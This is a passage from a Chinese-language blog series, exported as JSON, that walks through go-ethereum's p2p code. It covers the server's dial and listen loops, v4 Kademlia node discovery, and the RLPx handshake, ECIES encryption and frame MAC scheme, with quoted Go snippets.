public key&quot;)\n\t\t}\n\t}\n之后就是进行RLPX（RLPX会单独讲）握手\nremotePubkey, err := c.doEncHandshake(srv.PrivateKey, dialPubkey)\n如果dialDest 不为nil，检查公钥是否匹配，如果为nil,就从连接中返回一个node出来\nif dialDest != nil {\n\t\t// For dialed connections, check that the remote public key matches.\n\t\t//对于拨号连接，请检查远程公钥是否匹配\n\t\tif dialPubkey.X.Cmp(remotePubkey.X) != 0 || dialPubkey.Y.Cmp(remotePubkey.Y) != 0 {\n\t\t\treturn DiscUnexpectedIdentity\n\t\t}\n\t\tc.node = dialDest\n\t} else {\n\t\tc.node = nodeFromConn(remotePubkey, c.fd)\n\t}\n接下来就是真正执行握手了 ,这部分也属于RLPX，跳过\nphs, err := c.doProtoHandshake(srv.ourHandshake)\n之后要进行检查，如果成功了的话，连接就会作为节点被添加，并且启动了runPeer.\n到此为止，整个listenLoop 就完成了。\n\n\n\n设置节点发现\n进入到srv.setupDiscovery()\n①：添加特定于协议的发现源\nadded := make(map[string]bool)\n\tfor _, proto := range srv.Protocols {\n\t\tif proto.DialCandidates != nil &amp;&amp; !added[proto.Name] {\n\t\t\tsrv.discmix.AddSource(proto.DialCandidates)\n\t\t\tadded[proto.Name] = true\n\t\t}\n\t}\n②：如果DHT禁用的话，就不要在UDP上监听\nif srv.NoDiscovery &amp;&amp; !srv.DiscoveryV5 {\n\t\treturn nil\n\t}\n③：监听给定的socket 上的发现的包\nntab, err := discover.ListenUDP(conn, srv.localnode, cfg)\n创建DialState\ndialstate负责拨号和查找发现。\n①：初始化dialstate\ns := &amp;dialstate{\n   maxDynDials: maxdyn,\n   self:        self,\n   netrestrict: cfg.NetRestrict,\n   log:         cfg.Logger,\n   static:      make(map[enode.ID]*dialTask),\n   dialing:     make(map[enode.ID]connFlag),\n   bootnodes:   make([]*enode.Node, len(cfg.BootstrapNodes)),\n}\n②：加入初始引导节点\n\tcopy(s.bootnodes, cfg.BootstrapNodes)\n\tif s.log == nil {\n\t\ts.log = log.Root()\n\t}\n③： 加入静态节点\nfor _, n := range cfg.StaticNodes {\n\t\ts.addStatic(n)\n\t}\nbootnodes是初始引导节点，在节点没有接收到任何节点的连接请求，也没有节点可以给我们邻居节点的时候，就去连接bootnodes，它硬编码在了以太坊的源码中。\nstatic是静态节点，如果我们想和某些节点保持长期的连接，就把它们加入到静态节点的列表中\n接下来就是到了运行p2p网络的时候了，主要的函数是：go srv.run(dialer)\n\n运行p2p网络\nsrv.run(dialer)\n在p2p网络启动时候，我们会监听远程节点发送过来的TCP请求，到了运行p2p网络的时候，我们则会向远程节点发起TCP的连接请求。首先我们要知道我们所说的发起TCP连接请求可以形容成拨号，每个拨号都是以任务的形式存在，进入到srv.run(dialer)分析\n整个函数就是一个循环，介绍下它的主要功能：\n发起TCP连接任务\nscheduleTasks()\nscheduleTasks主要是从queued task 中去获取任务，通过查询dialer以查找新任务并立即启动尽可能多的任务，我们这里要注意个变量maxActiveDialTasks,它的默认值为16 ，而安排任务的核心方法是：\nnt := dialstate.newTasks(len(runningTasks)+len(queuedTasks), peers, time.Now())\n主要做了以下几件事：\n①：为没有连接的静态节点创建拨号任务\nfor id, t := range s.static {\n\t\terr := s.checkDial(t.dest, peers)\n\t\tswitch err {\n\t\tcase errNotWhitelisted, errSelf:\n\t\t\ts.log.Warn(&quot;Removing static dial candidate&quot;, &quot;id&quot;, t.dest.ID, &quot;addr&quot;, &amp;net.TCPAddr{IP: t.dest.IP(), Port: t.dest.TCP()}, &quot;err&quot;, err)\n\t\t\tdelete(s.static, t.dest.ID())\n\t\tcase nil:\n\t\t\ts.dialing[id] = t.flags\n\t\t\tnewtasks = append(newtasks, t)\n\t\t}\n\t}\n首先对拨号节点进行校验：正在连接，已经连接，是本身，不在白名单中，最近连接过的都会报错，并且不是在白名单中的和自身的节点会直接从静态节点列表中删除，校验通过的创建任务。\n②：计算所需的动态拨号数\nneedDynDials := s.maxDynDials\n\tfor _, p := range peers {\n\t\tif p.rw.is(dynDialedConn) {\n\t\t\tneedDynDials--\n\t\t}\n\t}\n\tfor _, flag := range s.dialing {\n\t\tif flag&amp;dynDialedConn != 0 {\n\t\t\tneedDynDials--\n\t\t}\n\t}\n我们主动发起的TCP连接请求是由节点最大连接数除以拨号比率得出的，即maxPeers/radio，同时我们会判断节点中是否已经有建立了连接的节点和正在拨号的节点，有的话会needDynDials会减去。\n③：如果找不到任何的peers,就去随机找bootnode，发起连接\n不过这个一般适用在测试网或者私链。\nif len(peers) == 0 &amp;&amp; len(s.bootnodes) &gt; 0 &amp;&amp; needDynDials &gt; 0 &amp;&amp; now.Sub(s.start) &gt; fallbackInterval {\n\t\tbootnode := s.bootnodes[0]\n\t\ts.bootnodes = append(s.bootnodes[:0], s.bootnodes[1:]...)\n\t\ts.bootnodes = append(s.bootnodes, bootnode)\n\t\tif addDial(dynDialedConn, bootnode) {\n\t\t\tneedDynDials--\n\t\t}\n\t}\n④：从节点发现结果中创建动态拨号任务\n如果不满足最大任务数量的话，就去s.lookupBuf中寻找，lookupBuf通过KAD算法获取的节点。\nfor ; i &lt; len(s.lookupBuf) &amp;&amp; needDynDials &gt; 0; i++ {\n\t\tif addDial(dynDialedConn, s.lookupBuf[i]) {\n\t\t\tneedDynDials--\n\t\t}\n\t}\n\ts.lookupBuf = s.lookupBuf[:copy(s.lookupBuf, s.lookupBuf[i:])]\n \nif len(s.lookupBuf) &lt; needDynDials &amp;&amp; !s.lookupRunning {\n\t\ts.lookupRunning = true\n\t\tnewtasks = append(newtasks, &amp;discoverTask{want: needDynDials - len(s.lookupBuf)})\n\t}\n⑤：没有需要执行的任务，保持拨号逻辑继续运行\nif nRunning == 0 &amp;&amp; len(newtasks) == 0 &amp;&amp; s.hist.Len() &gt; 0 {\n\t\tt := &amp;waitExpireTask{s.hist.nextExpiry().Sub(now)}\n\t\tnewtasks = append(newtasks, t)\n\t}\n到此创建新任务结束，返回newTasks\n\n执行TCP连接任务\n直到满足最大活动任务数才开始任务执行，具体的执行过程在以下代码：\nstartTasks := func(ts []task) (rest []task) {\n\t\ti := 0\n\t\tfor ; len(runningTasks) &lt; maxActiveDialTasks &amp;&amp; i &lt; len(ts); i++ {\n\t\t\tt := ts[i]\n\t\t\tsrv.log.Trace(&quot;New dial task&quot;, &quot;task&quot;, t)\n\t\t\tgo func() { t.Do(srv); taskdone &lt;- t }()\n\t\t\trunningTasks = append(runningTasks, t)\n\t\t}\n\t\treturn ts[i:]\n\t}\nt.Do(srv);\n执行的主要任务包括下面几种：\n\ndialTask\ndiscoverTask\nwaitExpireTask\n\n最关键的就是dialTask\nfunc (t *dialTask) Do(srv *Server) {\n\tif t.dest.Incomplete() {\n\t\tif !t.resolve(srv) {\n\t\t\treturn\n\t\t}\n\t}\n\terr := t.dial(srv, t.dest)\n\tif err != nil {\n\t\tsrv.log.Trace(&quot;Dial error&quot;, &quot;task&quot;, t, &quot;err&quot;, err)\n\t\t// Try resolving the ID of static nodes if dialing failed.\n\t\tif _, ok := err.(*dialError); ok &amp;&amp; t.flags&amp;staticDialedConn != 0 {\n\t\t\tif t.resolve(srv) {\n\t\t\t\tt.dial(srv, t.dest)\n\t\t\t}\n\t\t}\n\t}\n}\n真正的连接是在t.dail中做的：\n// 实际的网络连接操作\nfunc (t *dialTask) dial(srv *Server, dest *enode.Node) error {\n\tfd, err := srv.Dialer.Dial(dest)\n\tif err != nil {\n\t\treturn &amp;dialError{err}\n\t}\n\tmfd := newMeteredConn(fd, false, &amp;net.TCPAddr{IP: dest.IP(), Port: dest.TCP()})\n\treturn srv.SetupConn(mfd, t.flags, dest)\n}\n再往下面就没必要深究了，实际的网络连接操作到此为止了。\n\n管理TCP连接任务\n在TCP连接任务完成后，会对连接有各种处理，如下：\n①：停止p2p服务\ncase &lt;-srv.quit:\nbreak running\n②：添加静态节点到peer列表\ncase n := &lt;-srv.addstatic:\nsrv.log.Trace(&quot;Adding static node&quot;, &quot;node&quot;, n)\ndialstate.addStatic(n)\n③：发送断开连接请求，并断开连接\ncase n := &lt;-srv.removestatic:\ndialstate.removeStatic(n)\n\t\t\tif p, ok := peers[n.ID()]; ok {\n\t\t\t\tp.Disconnect(DiscRequested)\n\t\t\t}\n断开连接会立即返回，并且不会等连接关闭。\n④：标记可信节点\ncase n := &lt;-srv.addtrusted:\ntrusted[n.ID()] = true\n⑤：从信任节点中删除一个节点\ncase n := &lt;-srv.removetrusted:\ndelete(trusted, n.ID())\n⑥：拨号任务完成\ncase t := &lt;-taskdone:newTasks\ndialstate.taskDone(t, time.Now())\ndelTask(t)\n⑦：连接已通过加密握手,远程身份是已知的（但尚未经过验证）\ncase c := &lt;-srv.checkpointPostHandshake:\nc.cont &lt;- srv.postHandshakeChecks(peers, inboundCount, c)\n⑧：连接已通过协议握手，已知其功能并验证了远程身份\nerr := srv.addPeerChecks(peers, inboundCount, c)\n\t\t\tif err == nil {\n\t\t\t// 握手完成，所有检查完毕\n\t\t\t\tp := newPeer(srv.log, c, srv.Protocols)\n\t\t\t//启用了消息事件就把peerfeed传给peer\n\t\t\t\tif srv.EnableMsgEvents {\n\t\t\t\t\tp.events = &amp;srv.peerFeed\n\t\t\t\t}\n\t\t\t\tname := truncateName(c.name)\n\tp.RemoteAddr(), &quot;peers&quot;, len(peers)+1, &quot;name&quot;, name)\n\t\t\t\tgo srv.runPeer(p) // 重点\n\t\t\t\tpeers[c.node.ID()] = p\n\t\t\t\tif p.Inbound() {\n\t\t\t\t\tinboundCount++\n\t\t\t\t}\n\t\t\t\tif conn, ok := c.fd.(*meteredConn); ok {\n\t\t\t\t\tconn.handshakeDone(p)// \n\t\t\t\t}\n\t\t\t}\naddPeerChecks会删除没有匹配协议的连接，并且会重复握手后检查，因为自执行这些检查后可能已更改。连接通过握手后，将调用handshakeDone\n⑨：Peer断开连接\ncase pd := &lt;-srv.delpeer:\nd := common.PrettyDuration(mclock.Now() - pd.created)\n\t\t\tpd.log.Debug(&quot;Removing p2p peer&quot;, &quot;addr&quot;, pd.RemoteAddr(), &quot;peers&quot;, len(peers)-1, &quot;duration&quot;, d, &quot;req&quot;, pd.requested, &quot;err&quot;, pd.err)\n\t\t\tdelete(peers, pd.ID())\n\t\t\tif pd.Inbound() {\n\t\t\t\tinboundCount--\n\t\t\t}\n到此为止整个主要的处理TCP连接的循环讲解结束。\n\n总结&amp;参考\n\n开启p2p网络主要包括：设置本地节点，监听TCP连接以及设置节点发现\n运行P2P网络之后主要包括：发起TCP连接并执行连接，以及相关的连接处理。\n\n\n公众号：区块链技术栈\nmindcarver.cn/\ngithub.com/blockchainGuide/\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之p2p节点发现-3":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之p2p节点发现-3","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之p2p节点发现-3.md","title":"死磕以太坊源码分析之p2p节点发现-3","links":[],"tags":[],"content":"\n死磕以太坊源码分析之p2p节点发现\n\n在阅读节点发现源码之前必须要理解kadmilia算法，可以参考：KAD算法详解。\n节点发现概述\n节点发现，使本地节点得知其他节点的信息，进而加入到p2p网络中。\n以太坊的节点发现基于类似的kademlia算法，源码中有两个版本，v4和v5。v4适用于全节点，通过discover.ListenUDP使用，v5适用于轻节点通过discv5.ListenUDP使用，本文介绍的是v4版本。\n节点发现功能主要涉及 Server Table udp 这几个数据结构，它们有独自的事件响应循环，节点发现功能便是它们互相协作完成的。其中，每个以太坊客户端启动后都会在本地运行一个Server，并将网络拓扑中相邻的节点视为Node，而Table是Node的容器，udp则是负责维持底层的连接。这些结构的关系如下图：\n\np2p服务开启节点发现\n在P2p的server.go 的start方法中:\nif err := srv.setupDiscovery(); err != nil {\n\t\treturn err\n\t}\n进入到setupDiscovery中：\n// Discovery V4\n\tvar unhandled chan discover.ReadPacket\n\tvar sconn *sharedUDPConn\n\tif !srv.NoDiscovery {\n\t\t...\n\t\tntab, err := discover.ListenUDP(conn, srv.localnode, cfg)\n\t\t....\n\t}\ndiscover.ListenUDP方法即开启了节点发现的功能.\n首先解析出监听地址的UDP端口，根据端口返回与之相连的UDP连接，之后返回连接的本地网络地址，接着设置最后一个UDP-on-IPv4端口。到此为止节点发现的一些准备工作做好，接下下来开始UDP的监听：\nntab, err := discover.ListenUDP(conn, srv.localnode, cfg)\n然后进行UDP 的监听，下面是监听的过程：\n监听UDP\n// 监听给定的socket 上的发现的包\nfunc ListenUDP(c UDPConn, ln *enode.LocalNode, cfg Config) (*UDPv4, error) {\n\treturn ListenV4(c, ln, cfg)\n}\nfunc ListenV4(c UDPConn, ln *enode.LocalNode, cfg Config) (*UDPv4, error) {\n\tcloseCtx, cancel := context.WithCancel(context.Background())\n\tt := &amp;UDPv4{\n\t\tconn:            c,\n\t\tpriv:            cfg.PrivateKey,\n\t\tnetrestrict:     cfg.NetRestrict,\n\t\tlocalNode:       ln,\n\t\tdb:              ln.Database(),\n\t\tgotreply:        make(chan reply),\n\t\taddReplyMatcher: make(chan *replyMatcher),\n\t\tcloseCtx:        closeCtx,\n\t\tcancelCloseCtx:  cancel,\n\t\tlog:             cfg.Log,\n\t}\n\tif t.log == nil {\n\t\tt.log = log.Root()\n\t}\n \n\ttab, err := newTable(t, ln.Database(), cfg.Bootnodes, t.log) // \n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tt.tab = tab\n\tgo tab.loop() //\n \n\tt.wg.Add(2)\n\tgo t.loop() //\n\tgo t.readLoop(cfg.Unhandled) //\n\treturn t, nil\n}\n主要做了以下几件事：\n1.新建路由表\ntab, err := newTable(t, ln.Database(), cfg.Bootnodes, t.log) \n新建路由表做了以下几件事：\n\n初始化table对象\n设置bootnode（setFallbackNodes）\n\n节点第一次启动的时候，节点会与硬编码在以太坊源码中的bootnode进行连接，所有的节点加入几乎都先连接了它。连接上bootnode后，获取bootnode部分的邻居节点，然后进行节点发现，获取更多的活跃的邻居节点\nnursery 是在 Table 为空并且数据库中没有存储节点时的初始连接节点（上文中的 6 个节点），通过 bootnode 可以发现新的邻居\n\n\ntab.seedRand：使用提供的种子值将生成器初始化为确定性状态\nloadSeedNodes：加载种子节点；从保留已知节点的数据库中随机的抽取30个节点，再加上引导节点列表中的节点，放置入k桶中，如果K桶没有空间，则假如到替换列表中。\n\n2.测试邻居节点连通性\n首先知道UDP协议是没有连接的概念的，所以需要不断的ping 来测试对端节点是否正常，在新建路由表之后，就来到下面的循环，不断的去做上面的事。\ngo tab.loop()\n定时运行doRefresh、doRevalidate、copyLiveNodes进行刷新K桶。\n以太坊的k桶设置：\nconst (\n\talpha           = 3  // Kademlia并发参数, 是系统内一个优化参数,控制每次从K桶最多取出节点个数,ethereum取值3\n  \n\tbucketSize      = 16 // K桶大小(可容纳节点数)\n  \n\tmaxReplacements = 10 // 每桶更换列表的大小\n\thashBits          = len(common.Hash{}) * 8 //每个节点ID长度,32*8=256, 32位16进制\n\tnBuckets          = hashBits / 15       //  K桶个数\n  ）\n首先搞清楚这三个定时器运行的时间：\nrefreshInterval    = 30 * time.Minute\nrevalidateInterval = 10 * time.Second\ncopyNodesInterval  = 30 * time.Second\ndoRefresh\ndoRefresh对随机目标执行查找以保持K桶已满。如果表为空（初始引导程序或丢弃的有故障），则插入种子节点。\n主要以下几步：\n\n\n从数据库加载随机节点和引导节点。这应该会产生一些以前见过的节点\ntab.loadSeedNodes()\n\n\n将本地节点ID作为目标节点进行查找最近的邻居节点\ntab.net.lookupSelf()\nfunc (t *UDPv4) lookupSelf() []*enode.Node {\n\treturn t.newLookup(t.closeCtx, encodePubkey(&amp;t.priv.PublicKey)).run()\n}\nfunc (t *UDPv4) newLookup(ctx context.Context, targetKey encPubkey) *lookup {\n\t...\n\t\treturn t.findnode(n.ID(), n.addr(), targetKey)\n\t})\n\treturn it\n}\n向这些节点发起findnode操作查询离target节点最近的节点列表,将查询得到的节点进行ping-pong测试,将测试通过的节点落库保存\n经过这个流程后,节点的K桶就能够比较均匀地将不同网络节点更新到本地K桶中。\nunc (t *UDPv4) findnode(toid enode.ID, toaddr *net.UDPAddr, target encPubkey) ([]*node, error) {\n\tt.ensureBond(toid, toaddr)\n\tnodes := make([]*node, 0, bucketSize)\n\tnreceived := 0\n  // 设置回应回调函数，等待类型为neighborsPacket的邻近节点包，如果类型对，就执行回调请求\n\trm := t.pending(toid, toaddr.IP, p_neighborsV4, func(r interface{}) (matched bool, requestDone bool) {\n\t\treply := r.(*neighborsV4)\n\t\tfor _, rn := range reply.Nodes {\n\t\t\tnreceived++\n      // 得到一个简单的node结构\n\t\t\tn, err := t.nodeFromRPC(toaddr, rn)\n\t\t\tif err != nil {\n\t\t\t\tt.log.Trace(&quot;Invalid neighbor node received&quot;, &quot;ip&quot;, rn.IP, &quot;addr&quot;, toaddr, &quot;err&quot;, err)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tnodes = append(nodes, n)\n\t\t}\n\t\treturn true, nreceived &gt;= bucketSize\n\t})\n  //上面了一个管道事件，下面开始发送真正的findnode报文，然后进行等待了\n\tt.send(toaddr, toid, &amp;findnodeV4{\n\t\tTarget:     target,\n\t\tExpiration: uint64(time.Now().Add(expiration).Unix()),\n\t})\n\treturn nodes, &lt;-rm.errc\n}\n\n\n查找3个随机的目标节点\nfor i := 0; i &lt; 3; i++ {\n\t\ttab.net.lookupRandom()\n\t}\n\n\ndoRevalidate\ndoRevalidate检查随机存储桶中的最后一个节点是否仍然存在，如果不是，则替换或删除该节点。\n主要以下几步：\n\n\n返回随机的非空K桶中的最后一个节点\nlast, bi := tab.nodeToRevalidate()\n\n\n对最后的节点执行Ping操作，然后等待Pong\nremoteSeq, err := tab.net.ping(unwrapNode(last))\n\n\n如果节点ping通了的话，将节点移动到最前面\ntab.bumpInBucket(b, last)\n\n\n没有收到回复，选择一个替换节点，或者如果没有任何替换节点，则删除该节点\ntab.replace(b, last)\n\n\ncopyLiveNodes\ncopyLiveNodes将表中的节点添加到数据库,如果节点在表中的时间超过了5分钟。\n这部分代码比较简单，就伸展阐述。\nif n.livenessChecks &gt; 0 &amp;&amp; now.Sub(n.addedAt) &gt;= seedMinTableTime {\n\t\t\t\ttab.db.UpdateNode(unwrapNode(n))\n\t\t\t}\n3.检测各类信息\ngo t.loop()\nloop循环主要监听以下几类消息：\n\ncase ←t.closeCtx.Done()：检测是否停止\np := ←t.addReplyMatcher：检测是否有添加新的待处理消息\nr := ←t.gotreply：检测是否接收到其他节点的回复消息\n\n4. 处理UDP数据包\ngo t.readLoop(cfg.Unhandled)\n主要有以下两件事：\n\n\n循环接收其他节点发来的udp消息\nnbytes, from, err := t.conn.ReadFromUDP(buf)\n\n\n处理接收到的UDP消息\nt.handlePacket(from, buf[:nbytes])\n\n\n接下来对这两个函数进行进一步的解析。\n接收UDP消息\n接收UDP消息比较的简单，就是不断的从连接中读取Packet数据，它有以下几种消息：\n\n\nping：用于判断远程节点是否在线。\n\n\npong：用于回复ping消息的响应。\n\n\nfindnode：查找与给定的目标节点相近的节点。\n\n\nneighbors：用于回复findnode的响应，与给定的目标节点相近的节点列表\n\n\n\n处理UDP消息\n主要做了以下几件事：\n\n\n数据包解码\npacket, fromKey, hash, err := decodeV4(buf)\n\n\n检查数据包是否有效，是否可以处理\n packet.preverify(t, from, fromID, fromKey)\n在校验这一块，涉及不同的消息类型不同的校验，我们来分别对各种消息进行分析。\n①：ping\n\n校验消息是否过期\n校验公钥是否有效\n\n②：pong\n\n校验消息是否过期\n校验回复是否正确\n\n③：findNodes\n\n校验消息是否过期\n校验节点是否是最近的节点\n\n④：neighbors\n\n校验消息是否过期\n用于回复findnode的响应，校验回复是否正确\n\n\n\n处理packet数据\npacket.handle(t, from, fromID, hash)\n相同的，也会有4种消息，但是我们这边重点讲处理findNodes的消息：\n \n\n\nfunc (req *findnodeV4) handle(t *UDPv4, from *net.UDPAddr, fromID enode.ID, mac []byte) {\n…\n}\n\n我们这里就稍微介绍下如何处理`findnode`的消息：\n\n```go\nfunc (req *findnodeV4) handle(t *UDPv4, from *net.UDPAddr, fromID enode.ID, mac []byte) {\n\t// 确定最近的节点\n\ttarget := enode.ID(crypto.Keccak256Hash(req.Target[:]))\n\tt.tab.mutex.Lock()\n\t//最接近的返回表中最接近给定id的n个节点\n\tclosest := t.tab.closest(target, bucketSize, true).entries\n\tt.tab.mutex.Unlock()\n\t// 以每个数据包最多maxNeighbors的块的形式发送邻居，以保持在数据包大小限制以下。\n\tp := neighborsV4{Expiration: uint64(time.Now().Add(expiration).Unix())}\n\tvar sent bool\n\tfor _, n := range closest { //扫描这些最近的节点列表，然后一个包一个包的发送给对方\n\t\tif netutil.CheckRelayIP(from.IP, n.IP()) == nil {\n\t\t\tp.Nodes = append(p.Nodes, nodeToRPC(n))\n\t\t}\n\t\tif len(p.Nodes) == maxNeighbors {\n\t\t\tt.send(from, fromID, &amp;p)//给对方发送 neighborsPacket 包，里面包含节点列表\n\t\t\tp.Nodes = p.Nodes[:0]\n\t\t\tsent = true\n\t\t}\n\t}\n\tif len(p.Nodes) &gt; 0 || !sent {\n\t\tt.send(from, fromID, &amp;p)\n\t}\n}\n\n首先先确定最近的节点，再一个包一个包的发给对方，并校验节点的IP，最后把有效的节点发送给请求方。\n\n涉及的结构体：\nUDP\n\nconn ：接口，包括了从UDP中读取和写入，关闭UDP连接以及获取本地地址。\nnetrestrict：IP网络列表\nlocalNode：本地节点\ntab：路由表\n\n\nTable\n\n\nbuckets：所有节点都加到这个里面，按照距离\n\n\nnursery：启动节点\n\n\nrand：随机来源\n\n\nips：跟踪IP，确保IP中最多N个属于同一网络范围\n\n\nnet: UDP 传输的接口\n\n返回本地节点\n将enrRequest发送到给定的节点并等待响应\nfindnode向给定节点发送一个findnode请求，并等待该节点最多发送了k个邻居\n返回查找最近的节点\n将ping消息发送到给定的节点，然后等待答复\n\n\n\n以下是table的结构图：\n\n\n思维导图\n\n思维导图获取地址\n\n\n参考文档\n\nmindcarver.cn/     ⭐️⭐️⭐️⭐️\ngithub.com/blockchainGuide/ ⭐️⭐️⭐️⭐️\nwww.cnblogs.com/xiaolincoding/p/12571184.html\nqjpcpu.github.io/blog/2018/01/29/shen-ru-ethereumyuan-ma-p2pmo-kuai-ji-chu-jie-gou/\nwww.jianshu.com/p/b232c870dcd2\nbbs.huaweicloud.com/blogs/113684\nwww.jianshu.com/p/94d02a41a146\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之rlpx协议-4":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之rlpx协议-4","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之rlpx协议-4.md","title":"死磕以太坊源码分析之rlpx协议-4","links":[],"tags":[],"content":"\n死磕以太坊源码分析之rlpx协议\n\n本文主要参考自eth官方文档：rlpx协议\n符号\n\nX || Y：表示X和Y的串联\nX ^ Y： X和Y按位异或\nX[:N]：X的前N个字节\n[X, Y, Z, ...]：[X, Y, Z, …]的RLP递归编码\nkeccak256(MESSAGE)：以太坊使用的keccak256哈希算法\necies.encrypt(PUBKEY, MESSAGE, AUTHDATA)：RLPx使用的非对称身份验证加密函数     AUTHDATA是身份认证的数据，并非密文的一部分     但是AUTHDATA会在生成消息tag前，写入HMAC-256哈希函数\necdh.agree(PRIVKEY, PUBKEY)：是PRIVKEY和PUBKEY之间的椭圆曲线Diffie-Hellman协商函数\n\n\nECIES加密\nECIES (Elliptic Curve Integrated Encryption Scheme) 非对称加密用于RLPx握手。RLPx使用的加密系统：\n\n椭圆曲线secp256k1基点G\nKDF(k, len)：密钥推导函数 NIST SP 800-56 Concatenation\nMAC(k, m)：HMAC函数，使用了SHA-256哈希\nAES(k, iv, m)：AES-128对称加密函数，CTR模式\n\n假设Alice想发送加密消息给Bob，并且希望Bob可以用他的静态私钥kB解密。Alice知道Bob的静态公钥KB。\nAlice为了对消息m进行加密：\n\n生成一个随机数r并生成对应的椭圆曲线公钥R = r * G\n计算共享密码S = Px，其中 (Px, Py) = r * KB\n推导加密及认证所需的密钥kE || kM = KDF(S, 32)以及随机向量iv\n使用AES加密 c = AES(kE, iv, m)\n计算MAC校验 d = MAC(keccak256(kM), iv || c)\n发送完整密文R || iv || c || d给Bob\n\nBob对密文R || iv || c || d进行解密：\n\n推导共享密码S = Px, 其中(Px, Py) = r * KB = kB * R\n推导加密认证用的密钥kE || kM = KDF(S, 32)\n验证MACd = MAC(keccak256(kM), iv || c)\n获得明文m = AES(kE, iv || c)\n\n\n节点身份\n所有的加密操作都基于secp256k1椭圆曲线。每个节点维护一个静态的secp256k1私钥。建议该私钥只能进行手动重置（例如删除文件或数据库条目）。\n\n握手流程\nRLPx连接基于TCP通信，并且每次通信都会生成随机的临时密钥用于加密和验证。生成临时密钥的过程被称作“握手” (handshake)，握手在发起端（initiator, 发起TCP连接请求的节点）和接收端（recipient, 接受连接的节点）之间进行。\n\n发起端向接收端发起TCP连接，发送auth消息\n接收端接受连接，解密、验证auth消息（检查recovery of signature == keccak256(ephemeral-pubk)）\n接收端通过remote-ephemeral-pubk 和 nonce生成auth-ack消息\n接收端推导密钥，发送首个包含Hello消息的数据帧 (frame)\n发起端接收到auth-ack消息，导出密钥\n发起端发送首个加密后的数据帧，包含发起端Hello消息\n接收端接收并验证首个加密后的数据帧\n发起端接收并验证首个加密后的数据帧\n如果两边的首个加密数据帧的MAC都验证通过，则加密握手完成\n\n如果首个数据帧的验证失败，则任意一方都可以断开连接。\n握手消息\n发送端：\nauth = auth-size || enc-auth-body\nauth-size = size of enc-auth-body, encoded as a big-endian 16-bit integer\nauth-vsn = 4\nauth-body = [sig, initiator-pubk, initiator-nonce, auth-vsn, ...]\nenc-auth-body = ecies.encrypt(recipient-pubk, auth-body || auth-padding, auth-size)\nauth-padding = arbitrary data\n接收端：\nack = ack-size || enc-ack-body\nack-size = size of enc-ack-body, encoded as a big-endian 16-bit integer\nack-vsn = 4\nack-body = [recipient-ephemeral-pubk, recipient-nonce, ack-vsn, ...]\nenc-ack-body = ecies.encrypt(initiator-pubk, ack-body || ack-padding, ack-size)\nack-padding = arbitrary data\n实现必须忽略auth-vsn 和 ack-vsn中的所有不匹配。\n实现必须忽略auth-body 和 ack-body中的所有额外列表元素。\n握手消息互换后，密钥生成：\nstatic-shared-secret = ecdh.agree(privkey, remote-pubk)\nephemeral-key = ecdh.agree(ephemeral-privkey, remote-ephemeral-pubk)\nshared-secret = keccak256(ephemeral-key || keccak256(nonce || initiator-nonce))\naes-secret = keccak256(ephemeral-key || shared-secret)\nmac-secret = keccak256(ephemeral-key || aes-secret)\n帧结构\n握手后所有的消息都按帧 (frame) 传输。一帧数据携带属于某一功能的一条加密消息。\n分帧传输的主要目的是在单一连接上实现可靠的支持多路复用协议。其次，因数据包分帧，为消息认证码产生了适当的分界点，使得加密流变得简单了。通过握手生成的密钥对数据帧进行加密和验证。\n帧头提供关于消息大小和消息源功能的信息。填充字节用于防止缓存区不足，使得帧组件按指定区块字节大小对齐。\nframe = header-ciphertext || header-mac || frame-ciphertext || frame-mac\nheader-ciphertext = aes(aes-secret, header)\nheader = frame-size || header-data || header-padding\nheader-data = [capability-id, context-id]\ncapability-id = integer, always zero\ncontext-id = integer, always zero\nheader-padding = zero-fill header to 16-byte boundary\nframe-ciphertext = aes(aes-secret, frame-data || frame-padding)\nframe-padding = zero-fill frame-data to 16-byte boundary\n\nMAC\nRLPx中的消息认证 (Message authentication) 使用了两个keccak256状态，分别用于两个传输方向。egress-mac和ingress-mac分别代表发送和接收状态，每次发送或者接收密文，其状态都会更新。初始握手后，MAC状态初始化如下:\n发送端：\negress-mac = keccak256.init((mac-secret ^ recipient-nonce) || auth)\ningress-mac = keccak256.init((mac-secret ^ initiator-nonce) || ack)\n接收端：\negress-mac = keccak256.init((mac-secret ^ initiator-nonce) || ack)\ningress-mac = keccak256.init((mac-secret ^ recipient-nonce) || auth)\n当发送一帧数据时，通过即将发送的数据更新egress-mac状态，然后计算相应的MAC值。通过将帧头与其对应MAC值的加密输出异或来进行更新。这样做是为了确保对明文MAC和密文执行统一操作。所有的MAC值都以明文发送。\nheader-mac-seed = aes(mac-secret, keccak256.digest(egress-mac)[:16]) ^ header-ciphertext\negress-mac = keccak256.update(egress-mac, header-mac-seed)\nheader-mac = keccak256.digest(egress-mac)[:16]\n\n计算 frame-mac\negress-mac = keccak256.update(egress-mac, frame-ciphertext)\nframe-mac-seed = aes(mac-secret, keccak256.digest(egress-mac)[:16]) ^ keccak256.digest(egress-mac)[:16]\negress-mac = keccak256.update(egress-mac, frame-mac-seed)\nframe-mac = keccak256.digest(egress-mac)[:16]\n\n只要发送者和接受者按相同方式更新egress-mac和ingress-mac，并且在ingress帧中比对header-mac 和 frame-mac的值，就能对ingress帧中的MAC值进行校验。这一步应当在解密header-ciphertext 和 frame-ciphertext之前完成。\n\n功能消息\n初始握手后的所有消息均与“功能”相关。单个RLPx连接上就可以同时使用任何数量的功能。\n功能由简短的ASCII名称和版本号标识。连接两端都支持的功能在隶属于“ p2p”功能的Hello消息中进行交换，p2p功能需要在所有连接中都可用。\n消息编码\n初始Hello消息编码如下：\nframe-data = msg-id || msg-data\nframe-size = length of frame-data, encoded as a 24bit big-endian 